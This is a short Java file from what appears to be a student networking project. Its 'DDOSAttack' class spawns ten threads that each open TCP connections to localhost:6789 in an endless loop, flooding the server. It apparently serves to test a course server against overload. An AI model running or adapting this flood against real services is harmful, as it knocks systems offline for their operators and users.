package NetworksProject1;

import java.io.*;
import java.net.*;

public class BadClient2{

    public static void main(String[]args)throws Exception{
        String sentence; // data to send to server
        String modifiedSentence; // received from server
        int id=0;
        while(id<10) {
            System.out.println(++id);
            // create a new thread object
            DDOSAttack attack= new DDOSAttack ("localhost",6789);
            // This thread will handle the client separately
            new Thread(attack).start();

        }
    }
    // DDOS class
    private static class DDOSAttack implements Runnable {
        private final String host;
        private final int port;

        // Constructor
        public DDOSAttack(String host,int port)
        {
            this.host = host;
            this.port=port;
        }

        public void run() {
            while (true) {
                try {
                    // create client socket and connect to server; this initiates TCP cnx between client and server
                    Socket clientSocket = new Socket(host, port);
                } catch (IOException e) {
                    e.printStackTrace();
                }

            }
        }
    }
}